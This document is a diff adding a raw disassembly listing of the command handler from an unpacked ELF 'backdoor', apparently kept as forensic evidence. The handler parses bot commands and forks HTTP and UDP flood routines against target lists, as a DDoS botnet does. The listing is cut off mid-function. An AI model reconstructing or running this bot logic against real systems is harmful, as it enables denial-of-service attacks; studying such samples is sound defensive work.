@@ -1,0 +1,2171 @@
+
+evidence/backdoor-unpacked.elf:	file format elf32-i386
+
+Disassembly of section .text:
+
+0804bdee <processCmd>:
+ 804bdee: 55                           	pushl	%ebp
+ 804bdef: 89 e5                        	movl	%esp, %ebp
+ 804bdf1: 57                           	pushl	%edi
+ 804bdf2: 56                           	pushl	%esi
+ 804bdf3: 53                           	pushl	%ebx
+ 804bdf4: 81 ec 0c 03 00 00            	subl	$0x30c, %esp            # imm = 0x30C
+ 804bdfa: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bdfd: 8b 00                        	movl	(%eax), %eax
+ 804bdff: 89 85 f4 fd ff ff            	movl	%eax, -0x20c(%ebp)
+ 804be05: c7 85 f0 fd ff ff f5 8d 05 08	movl	$0x8058df5, -0x210(%ebp) # imm = 0x8058DF5
+ 804be0f: c7 85 ec fd ff ff 05 00 00 00	movl	$0x5, -0x214(%ebp)
+ 804be19: fc                           	cld
+ 804be1a: 8b b5 f4 fd ff ff            	movl	-0x20c(%ebp), %esi
+ 804be20: 8b bd f0 fd ff ff            	movl	-0x210(%ebp), %edi
+ 804be26: 8b 8d ec fd ff ff            	movl	-0x214(%ebp), %ecx
+ 804be2c: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804be2e: 0f 97 c2                     	seta	%dl
+ 804be31: 0f 92 c0                     	setb	%al
+ 804be34: 88 d1                        	movb	%dl, %cl
+ 804be36: 28 c1                        	subb	%al, %cl
+ 804be38: 88 c8                        	movb	%cl, %al
+ 804be3a: 0f be c0                     	movsbl	%al, %eax
+ 804be3d: 85 c0                        	testl	%eax, %eax
+ 804be3f: 0f 85 ba 00 00 00            	jne	0x804beff <processCmd+0x111>
+ 804be45: 83 7d 08 04                  	cmpl	$0x4, 0x8(%ebp)
+ 804be49: 0f 8e 79 23 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804be4f: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804be52: 83 c0 0c                     	addl	$0xc, %eax
+ 804be55: 8b 00                        	movl	(%eax), %eax
+ 804be57: 89 04 24                     	movl	%eax, (%esp)
+ 804be5a: e8 7d 75 00 00               	calll	0x80533dc <atol>
+ 804be5f: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804be64: 0f 8f 5e 23 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804be6a: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804be6d: 83 c0 10                     	addl	$0x10, %eax
+ 804be70: 8b 00                        	movl	(%eax), %eax
+ 804be72: 89 04 24                     	movl	%eax, (%esp)
+ 804be75: e8 62 75 00 00               	calll	0x80533dc <atol>
+ 804be7a: 85 c0                        	testl	%eax, %eax
+ 804be7c: 7f 05                        	jg	0x804be83 <processCmd+0x95>
+ 804be7e: e9 45 23 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804be83: e8 cd d8 ff ff               	calll	0x8049755 <listFork>
+ 804be88: 85 c0                        	testl	%eax, %eax
+ 804be8a: 0f 85 38 23 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804be90: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804be93: 83 c0 14                     	addl	$0x14, %eax
+ 804be96: 8b 00                        	movl	(%eax), %eax
+ 804be98: 89 c3                        	movl	%eax, %ebx
+ 804be9a: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804be9d: 83 c0 10                     	addl	$0x10, %eax
+ 804bea0: 8b 00                        	movl	(%eax), %eax
+ 804bea2: 89 04 24                     	movl	%eax, (%esp)
+ 804bea5: e8 32 75 00 00               	calll	0x80533dc <atol>
+ 804beaa: 89 c6                        	movl	%eax, %esi
+ 804beac: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804beaf: 83 c0 0c                     	addl	$0xc, %eax
+ 804beb2: 8b 00                        	movl	(%eax), %eax
+ 804beb4: 89 04 24                     	movl	%eax, (%esp)
+ 804beb7: e8 20 75 00 00               	calll	0x80533dc <atol>
+ 804bebc: 89 c7                        	movl	%eax, %edi
+ 804bebe: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bec1: 83 c0 08                     	addl	$0x8, %eax
+ 804bec4: 8b 00                        	movl	(%eax), %eax
+ 804bec6: 89 04 24                     	movl	%eax, (%esp)
+ 804bec9: e8 0e 75 00 00               	calll	0x80533dc <atol>
+ 804bece: 0f b7 c0                     	movzwl	%ax, %eax
+ 804bed1: 89 c2                        	movl	%eax, %edx
+ 804bed3: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bed6: 83 c0 04                     	addl	$0x4, %eax
+ 804bed9: 8b 00                        	movl	(%eax), %eax
+ 804bedb: 89 5c 24 10                  	movl	%ebx, 0x10(%esp)
+ 804bedf: 89 74 24 0c                  	movl	%esi, 0xc(%esp)
+ 804bee3: 89 7c 24 08                  	movl	%edi, 0x8(%esp)
+ 804bee7: 89 54 24 04                  	movl	%edx, 0x4(%esp)
+ 804beeb: 89 04 24                     	movl	%eax, (%esp)
+ 804beee: e8 1f fa ff ff               	calll	0x804b912 <httphex>
+ 804bef3: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804befa: e8 31 76 00 00               	calll	0x8053530 <exit>
+ 804beff: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bf02: 8b 00                        	movl	(%eax), %eax
+ 804bf04: 89 85 e8 fd ff ff            	movl	%eax, -0x218(%ebp)
+ 804bf0a: c7 85 e4 fd ff ff fa 8d 05 08	movl	$0x8058dfa, -0x21c(%ebp) # imm = 0x8058DFA
+ 804bf14: c7 85 e0 fd ff ff 05 00 00 00	movl	$0x5, -0x220(%ebp)
+ 804bf1e: fc                           	cld
+ 804bf1f: 8b b5 e8 fd ff ff            	movl	-0x218(%ebp), %esi
+ 804bf25: 8b bd e4 fd ff ff            	movl	-0x21c(%ebp), %edi
+ 804bf2b: 8b 8d e0 fd ff ff            	movl	-0x220(%ebp), %ecx
+ 804bf31: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804bf33: 0f 97 c2                     	seta	%dl
+ 804bf36: 0f 92 c0                     	setb	%al
+ 804bf39: 88 d1                        	movb	%dl, %cl
+ 804bf3b: 28 c1                        	subb	%al, %cl
+ 804bf3d: 88 c8                        	movb	%cl, %al
+ 804bf3f: 0f be c0                     	movsbl	%al, %eax
+ 804bf42: 85 c0                        	testl	%eax, %eax
+ 804bf44: 0f 85 4f 02 00 00            	jne	0x804c199 <processCmd+0x3ab>
+ 804bf4a: 83 7d 08 05                  	cmpl	$0x5, 0x8(%ebp)
+ 804bf4e: 0f 8e 74 22 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804bf54: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bf57: 83 c0 0c                     	addl	$0xc, %eax
+ 804bf5a: 8b 00                        	movl	(%eax), %eax
+ 804bf5c: 89 04 24                     	movl	%eax, (%esp)
+ 804bf5f: e8 78 74 00 00               	calll	0x80533dc <atol>
+ 804bf64: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804bf69: 0f 8f 59 22 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804bf6f: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bf72: 83 c0 14                     	addl	$0x14, %eax
+ 804bf75: 8b 00                        	movl	(%eax), %eax
+ 804bf77: 89 04 24                     	movl	%eax, (%esp)
+ 804bf7a: e8 5d 74 00 00               	calll	0x80533dc <atol>
+ 804bf7f: 3d 00 00 01 00               	cmpl	$0x10000, %eax          # imm = 0x10000
+ 804bf84: 0f 8f 3e 22 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804bf8a: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bf8d: 83 c0 10                     	addl	$0x10, %eax
+ 804bf90: 8b 00                        	movl	(%eax), %eax
+ 804bf92: 89 04 24                     	movl	%eax, (%esp)
+ 804bf95: e8 42 74 00 00               	calll	0x80533dc <atol>
+ 804bf9a: 83 f8 20                     	cmpl	$0x20, %eax
+ 804bf9d: 0f 8f 25 22 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804bfa3: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bfa6: 83 c0 18                     	addl	$0x18, %eax
+ 804bfa9: 8b 00                        	movl	(%eax), %eax
+ 804bfab: 89 04 24                     	movl	%eax, (%esp)
+ 804bfae: e8 29 74 00 00               	calll	0x80533dc <atol>
+ 804bfb3: 85 c0                        	testl	%eax, %eax
+ 804bfb5: 7f 05                        	jg	0x804bfbc <processCmd+0x1ce>
+ 804bfb7: e9 0c 22 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804bfbc: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bfbf: 83 c0 04                     	addl	$0x4, %eax
+ 804bfc2: 8b 00                        	movl	(%eax), %eax
+ 804bfc4: 89 85 30 fe ff ff            	movl	%eax, -0x1d0(%ebp)
+ 804bfca: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bfcd: 83 c0 08                     	addl	$0x8, %eax
+ 804bfd0: 8b 00                        	movl	(%eax), %eax
+ 804bfd2: 89 04 24                     	movl	%eax, (%esp)
+ 804bfd5: e8 02 74 00 00               	calll	0x80533dc <atol>
+ 804bfda: 89 85 34 fe ff ff            	movl	%eax, -0x1cc(%ebp)
+ 804bfe0: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bfe3: 83 c0 0c                     	addl	$0xc, %eax
+ 804bfe6: 8b 00                        	movl	(%eax), %eax
+ 804bfe8: 89 04 24                     	movl	%eax, (%esp)
+ 804bfeb: e8 ec 73 00 00               	calll	0x80533dc <atol>
+ 804bff0: 89 85 38 fe ff ff            	movl	%eax, -0x1c8(%ebp)
+ 804bff6: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804bff9: 83 c0 10                     	addl	$0x10, %eax
+ 804bffc: 8b 00                        	movl	(%eax), %eax
+ 804bffe: 89 04 24                     	movl	%eax, (%esp)
+ 804c001: e8 d6 73 00 00               	calll	0x80533dc <atol>
+ 804c006: 89 85 3c fe ff ff            	movl	%eax, -0x1c4(%ebp)
+ 804c00c: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c00f: 83 c0 14                     	addl	$0x14, %eax
+ 804c012: 8b 00                        	movl	(%eax), %eax
+ 804c014: 89 04 24                     	movl	%eax, (%esp)
+ 804c017: e8 c0 73 00 00               	calll	0x80533dc <atol>
+ 804c01c: 89 85 40 fe ff ff            	movl	%eax, -0x1c0(%ebp)
+ 804c022: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c025: 83 c0 18                     	addl	$0x18, %eax
+ 804c028: 8b 00                        	movl	(%eax), %eax
+ 804c02a: 89 04 24                     	movl	%eax, (%esp)
+ 804c02d: e8 aa 73 00 00               	calll	0x80533dc <atol>
+ 804c032: 89 85 44 fe ff ff            	movl	%eax, -0x1bc(%ebp)
+ 804c038: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c03b: 83 c0 1c                     	addl	$0x1c, %eax
+ 804c03e: 8b 00                        	movl	(%eax), %eax
+ 804c040: 89 04 24                     	movl	%eax, (%esp)
+ 804c043: e8 94 73 00 00               	calll	0x80533dc <atol>
+ 804c048: 89 85 48 fe ff ff            	movl	%eax, -0x1b8(%ebp)
+ 804c04e: c7 85 4c fe ff ff 00 00 00 00	movl	$0x0, -0x1b4(%ebp)
+ 804c058: 8b 85 30 fe ff ff            	movl	-0x1d0(%ebp), %eax
+ 804c05e: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804c066: 89 04 24                     	movl	%eax, (%esp)
+ 804c069: e8 f2 54 00 00               	calll	0x8051560 <strchr>
+ 804c06e: 85 c0                        	testl	%eax, %eax
+ 804c070: 0f 84 b6 00 00 00            	je	0x804c12c <processCmd+0x33e>
+ 804c076: 8b 85 30 fe ff ff            	movl	-0x1d0(%ebp), %eax
+ 804c07c: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c084: 89 04 24                     	movl	%eax, (%esp)
+ 804c087: e8 28 57 00 00               	calll	0x80517b4 <strtok>
+ 804c08c: 89 85 50 fe ff ff            	movl	%eax, -0x1b0(%ebp)
+ 804c092: e9 83 00 00 00               	jmp	0x804c11a <processCmd+0x32c>
+ 804c097: e8 b9 d6 ff ff               	calll	0x8049755 <listFork>
+ 804c09c: 85 c0                        	testl	%eax, %eax
+ 804c09e: 75 60                        	jne	0x804c100 <processCmd+0x312>
+ 804c0a0: 8b 85 4c fe ff ff            	movl	-0x1b4(%ebp), %eax
+ 804c0a6: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804c0aa: 8b 85 48 fe ff ff            	movl	-0x1b8(%ebp), %eax
+ 804c0b0: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804c0b4: 8b 85 44 fe ff ff            	movl	-0x1bc(%ebp), %eax
+ 804c0ba: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804c0be: 8b 85 40 fe ff ff            	movl	-0x1c0(%ebp), %eax
+ 804c0c4: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804c0c8: 8b 85 3c fe ff ff            	movl	-0x1c4(%ebp), %eax
+ 804c0ce: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804c0d2: 8b 85 38 fe ff ff            	movl	-0x1c8(%ebp), %eax
+ 804c0d8: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c0dc: 8b 85 34 fe ff ff            	movl	-0x1cc(%ebp), %eax
+ 804c0e2: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c0e6: 8b 85 50 fe ff ff            	movl	-0x1b0(%ebp), %eax
+ 804c0ec: 89 04 24                     	movl	%eax, (%esp)
+ 804c0ef: e8 6d d9 ff ff               	calll	0x8049a61 <udpfl00d>
+ 804c0f4: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c0fb: e8 b8 40 00 00               	calll	0x80501b8 <_exit>
+ 804c100: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c108: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c10f: e8 a0 56 00 00               	calll	0x80517b4 <strtok>
+ 804c114: 89 85 50 fe ff ff            	movl	%eax, -0x1b0(%ebp)
+ 804c11a: 83 bd 50 fe ff ff 00         	cmpl	$0x0, -0x1b0(%ebp)
+ 804c121: 0f 85 70 ff ff ff            	jne	0x804c097 <processCmd+0x2a9>
+ 804c127: e9 9c 20 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804c12c: e8 24 d6 ff ff               	calll	0x8049755 <listFork>
+ 804c131: 85 c0                        	testl	%eax, %eax
+ 804c133: 0f 85 8f 20 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804c139: 8b 85 4c fe ff ff            	movl	-0x1b4(%ebp), %eax
+ 804c13f: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804c143: 8b 85 48 fe ff ff            	movl	-0x1b8(%ebp), %eax
+ 804c149: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804c14d: 8b 85 44 fe ff ff            	movl	-0x1bc(%ebp), %eax
+ 804c153: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804c157: 8b 85 40 fe ff ff            	movl	-0x1c0(%ebp), %eax
+ 804c15d: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804c161: 8b 85 3c fe ff ff            	movl	-0x1c4(%ebp), %eax
+ 804c167: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804c16b: 8b 85 38 fe ff ff            	movl	-0x1c8(%ebp), %eax
+ 804c171: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c175: 8b 85 34 fe ff ff            	movl	-0x1cc(%ebp), %eax
+ 804c17b: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c17f: 8b 85 30 fe ff ff            	movl	-0x1d0(%ebp), %eax
+ 804c185: 89 04 24                     	movl	%eax, (%esp)
+ 804c188: e8 d4 d8 ff ff               	calll	0x8049a61 <udpfl00d>
+ 804c18d: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c194: e8 1f 40 00 00               	calll	0x80501b8 <_exit>
+ 804c199: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c19c: 8b 00                        	movl	(%eax), %eax
+ 804c19e: 89 85 dc fd ff ff            	movl	%eax, -0x224(%ebp)
+ 804c1a4: c7 85 d8 fd ff ff ff 8d 05 08	movl	$0x8058dff, -0x228(%ebp) # imm = 0x8058DFF
+ 804c1ae: c7 85 d4 fd ff ff 03 00 00 00	movl	$0x3, -0x22c(%ebp)
+ 804c1b8: fc                           	cld
+ 804c1b9: 8b b5 dc fd ff ff            	movl	-0x224(%ebp), %esi
+ 804c1bf: 8b bd d8 fd ff ff            	movl	-0x228(%ebp), %edi
+ 804c1c5: 8b 8d d4 fd ff ff            	movl	-0x22c(%ebp), %ecx
+ 804c1cb: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804c1cd: 0f 97 c2                     	seta	%dl
+ 804c1d0: 0f 92 c0                     	setb	%al
+ 804c1d3: 88 d1                        	movb	%dl, %cl
+ 804c1d5: 28 c1                        	subb	%al, %cl
+ 804c1d7: 88 c8                        	movb	%cl, %al
+ 804c1d9: 0f be c0                     	movsbl	%al, %eax
+ 804c1dc: 85 c0                        	testl	%eax, %eax
+ 804c1de: 0f 85 44 01 00 00            	jne	0x804c328 <processCmd+0x53a>
+ 804c1e4: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804c1e8: 0f 8e da 1f 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c1ee: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c1f1: 83 c0 08                     	addl	$0x8, %eax
+ 804c1f4: 8b 00                        	movl	(%eax), %eax
+ 804c1f6: 89 04 24                     	movl	%eax, (%esp)
+ 804c1f9: e8 de 71 00 00               	calll	0x80533dc <atol>
+ 804c1fe: 85 c0                        	testl	%eax, %eax
+ 804c200: 0f 8e c2 1f 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c206: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c209: 83 c0 0c                     	addl	$0xc, %eax
+ 804c20c: 8b 00                        	movl	(%eax), %eax
+ 804c20e: 89 04 24                     	movl	%eax, (%esp)
+ 804c211: e8 c6 71 00 00               	calll	0x80533dc <atol>
+ 804c216: 85 c0                        	testl	%eax, %eax
+ 804c218: 7f 05                        	jg	0x804c21f <processCmd+0x431>
+ 804c21a: e9 a9 1f 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804c21f: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c222: 83 c0 04                     	addl	$0x4, %eax
+ 804c225: 8b 00                        	movl	(%eax), %eax
+ 804c227: 89 85 54 fe ff ff            	movl	%eax, -0x1ac(%ebp)
+ 804c22d: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c230: 83 c0 08                     	addl	$0x8, %eax
+ 804c233: 8b 00                        	movl	(%eax), %eax
+ 804c235: 89 04 24                     	movl	%eax, (%esp)
+ 804c238: e8 9f 71 00 00               	calll	0x80533dc <atol>
+ 804c23d: 89 85 58 fe ff ff            	movl	%eax, -0x1a8(%ebp)
+ 804c243: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c246: 83 c0 0c                     	addl	$0xc, %eax
+ 804c249: 8b 00                        	movl	(%eax), %eax
+ 804c24b: 89 04 24                     	movl	%eax, (%esp)
+ 804c24e: e8 89 71 00 00               	calll	0x80533dc <atol>
+ 804c253: 89 85 5c fe ff ff            	movl	%eax, -0x1a4(%ebp)
+ 804c259: 8b 85 54 fe ff ff            	movl	-0x1ac(%ebp), %eax
+ 804c25f: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804c267: 89 04 24                     	movl	%eax, (%esp)
+ 804c26a: e8 f1 52 00 00               	calll	0x8051560 <strchr>
+ 804c26f: 85 c0                        	testl	%eax, %eax
+ 804c271: 74 7a                        	je	0x804c2ed <processCmd+0x4ff>
+ 804c273: 8b 85 54 fe ff ff            	movl	-0x1ac(%ebp), %eax
+ 804c279: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c281: 89 04 24                     	movl	%eax, (%esp)
+ 804c284: e8 2b 55 00 00               	calll	0x80517b4 <strtok>
+ 804c289: 89 85 60 fe ff ff            	movl	%eax, -0x1a0(%ebp)
+ 804c28f: eb 51                        	jmp	0x804c2e2 <processCmd+0x4f4>
+ 804c291: e8 bf d4 ff ff               	calll	0x8049755 <listFork>
+ 804c296: 85 c0                        	testl	%eax, %eax
+ 804c298: 75 2e                        	jne	0x804c2c8 <processCmd+0x4da>
+ 804c29a: 8b 85 5c fe ff ff            	movl	-0x1a4(%ebp), %eax
+ 804c2a0: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c2a4: 8b 85 58 fe ff ff            	movl	-0x1a8(%ebp), %eax
+ 804c2aa: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c2ae: 8b 85 60 fe ff ff            	movl	-0x1a0(%ebp), %eax
+ 804c2b4: 89 04 24                     	movl	%eax, (%esp)
+ 804c2b7: e8 f3 e6 ff ff               	calll	0x804a9af <audprand2>
+ 804c2bc: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c2c3: e8 f0 3e 00 00               	calll	0x80501b8 <_exit>
+ 804c2c8: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c2d0: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c2d7: e8 d8 54 00 00               	calll	0x80517b4 <strtok>
+ 804c2dc: 89 85 60 fe ff ff            	movl	%eax, -0x1a0(%ebp)
+ 804c2e2: 83 bd 60 fe ff ff 00         	cmpl	$0x0, -0x1a0(%ebp)
+ 804c2e9: 75 a6                        	jne	0x804c291 <processCmd+0x4a3>
+ 804c2eb: eb 3b                        	jmp	0x804c328 <processCmd+0x53a>
+ 804c2ed: e8 63 d4 ff ff               	calll	0x8049755 <listFork>
+ 804c2f2: 85 c0                        	testl	%eax, %eax
+ 804c2f4: 0f 85 ce 1e 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804c2fa: 8b 85 5c fe ff ff            	movl	-0x1a4(%ebp), %eax
+ 804c300: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c304: 8b 85 58 fe ff ff            	movl	-0x1a8(%ebp), %eax
+ 804c30a: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c30e: 8b 85 54 fe ff ff            	movl	-0x1ac(%ebp), %eax
+ 804c314: 89 04 24                     	movl	%eax, (%esp)
+ 804c317: e8 93 e6 ff ff               	calll	0x804a9af <audprand2>
+ 804c31c: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c323: e8 90 3e 00 00               	calll	0x80501b8 <_exit>
+ 804c328: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c32b: 8b 00                        	movl	(%eax), %eax
+ 804c32d: 89 85 d0 fd ff ff            	movl	%eax, -0x230(%ebp)
+ 804c333: c7 85 cc fd ff ff 02 8e 05 08	movl	$0x8058e02, -0x234(%ebp) # imm = 0x8058E02
+ 804c33d: c7 85 c8 fd ff ff 05 00 00 00	movl	$0x5, -0x238(%ebp)
+ 804c347: fc                           	cld
+ 804c348: 8b b5 d0 fd ff ff            	movl	-0x230(%ebp), %esi
+ 804c34e: 8b bd cc fd ff ff            	movl	-0x234(%ebp), %edi
+ 804c354: 8b 8d c8 fd ff ff            	movl	-0x238(%ebp), %ecx
+ 804c35a: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804c35c: 0f 97 c2                     	seta	%dl
+ 804c35f: 0f 92 c0                     	setb	%al
+ 804c362: 88 d1                        	movb	%dl, %cl
+ 804c364: 28 c1                        	subb	%al, %cl
+ 804c366: 88 c8                        	movb	%cl, %al
+ 804c368: 0f be c0                     	movsbl	%al, %eax
+ 804c36b: 85 c0                        	testl	%eax, %eax
+ 804c36d: 0f 85 44 01 00 00            	jne	0x804c4b7 <processCmd+0x6c9>
+ 804c373: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804c377: 0f 8e 4b 1e 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c37d: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c380: 83 c0 08                     	addl	$0x8, %eax
+ 804c383: 8b 00                        	movl	(%eax), %eax
+ 804c385: 89 04 24                     	movl	%eax, (%esp)
+ 804c388: e8 4f 70 00 00               	calll	0x80533dc <atol>
+ 804c38d: 85 c0                        	testl	%eax, %eax
+ 804c38f: 0f 8e 33 1e 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c395: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c398: 83 c0 0c                     	addl	$0xc, %eax
+ 804c39b: 8b 00                        	movl	(%eax), %eax
+ 804c39d: 89 04 24                     	movl	%eax, (%esp)
+ 804c3a0: e8 37 70 00 00               	calll	0x80533dc <atol>
+ 804c3a5: 85 c0                        	testl	%eax, %eax
+ 804c3a7: 7f 05                        	jg	0x804c3ae <processCmd+0x5c0>
+ 804c3a9: e9 1a 1e 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804c3ae: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c3b1: 83 c0 04                     	addl	$0x4, %eax
+ 804c3b4: 8b 00                        	movl	(%eax), %eax
+ 804c3b6: 89 85 64 fe ff ff            	movl	%eax, -0x19c(%ebp)
+ 804c3bc: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c3bf: 83 c0 08                     	addl	$0x8, %eax
+ 804c3c2: 8b 00                        	movl	(%eax), %eax
+ 804c3c4: 89 04 24                     	movl	%eax, (%esp)
+ 804c3c7: e8 10 70 00 00               	calll	0x80533dc <atol>
+ 804c3cc: 89 85 68 fe ff ff            	movl	%eax, -0x198(%ebp)
+ 804c3d2: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c3d5: 83 c0 0c                     	addl	$0xc, %eax
+ 804c3d8: 8b 00                        	movl	(%eax), %eax
+ 804c3da: 89 04 24                     	movl	%eax, (%esp)
+ 804c3dd: e8 fa 6f 00 00               	calll	0x80533dc <atol>
+ 804c3e2: 89 85 6c fe ff ff            	movl	%eax, -0x194(%ebp)
+ 804c3e8: 8b 85 64 fe ff ff            	movl	-0x19c(%ebp), %eax
+ 804c3ee: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804c3f6: 89 04 24                     	movl	%eax, (%esp)
+ 804c3f9: e8 62 51 00 00               	calll	0x8051560 <strchr>
+ 804c3fe: 85 c0                        	testl	%eax, %eax
+ 804c400: 74 7a                        	je	0x804c47c <processCmd+0x68e>
+ 804c402: 8b 85 64 fe ff ff            	movl	-0x19c(%ebp), %eax
+ 804c408: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c410: 89 04 24                     	movl	%eax, (%esp)
+ 804c413: e8 9c 53 00 00               	calll	0x80517b4 <strtok>
+ 804c418: 89 85 70 fe ff ff            	movl	%eax, -0x190(%ebp)
+ 804c41e: eb 51                        	jmp	0x804c471 <processCmd+0x683>
+ 804c420: e8 30 d3 ff ff               	calll	0x8049755 <listFork>
+ 804c425: 85 c0                        	testl	%eax, %eax
+ 804c427: 75 2e                        	jne	0x804c457 <processCmd+0x669>
+ 804c429: 8b 85 6c fe ff ff            	movl	-0x194(%ebp), %eax
+ 804c42f: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c433: 8b 85 68 fe ff ff            	movl	-0x198(%ebp), %eax
+ 804c439: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c43d: 8b 85 70 fe ff ff            	movl	-0x190(%ebp), %eax
+ 804c443: 89 04 24                     	movl	%eax, (%esp)
+ 804c446: e8 f9 e8 ff ff               	calll	0x804ad44 <audprand3>
+ 804c44b: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c452: e8 61 3d 00 00               	calll	0x80501b8 <_exit>
+ 804c457: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c45f: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c466: e8 49 53 00 00               	calll	0x80517b4 <strtok>
+ 804c46b: 89 85 70 fe ff ff            	movl	%eax, -0x190(%ebp)
+ 804c471: 83 bd 70 fe ff ff 00         	cmpl	$0x0, -0x190(%ebp)
+ 804c478: 75 a6                        	jne	0x804c420 <processCmd+0x632>
+ 804c47a: eb 3b                        	jmp	0x804c4b7 <processCmd+0x6c9>
+ 804c47c: e8 d4 d2 ff ff               	calll	0x8049755 <listFork>
+ 804c481: 85 c0                        	testl	%eax, %eax
+ 804c483: 0f 85 3f 1d 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804c489: 8b 85 6c fe ff ff            	movl	-0x194(%ebp), %eax
+ 804c48f: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c493: 8b 85 68 fe ff ff            	movl	-0x198(%ebp), %eax
+ 804c499: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c49d: 8b 85 64 fe ff ff            	movl	-0x19c(%ebp), %eax
+ 804c4a3: 89 04 24                     	movl	%eax, (%esp)
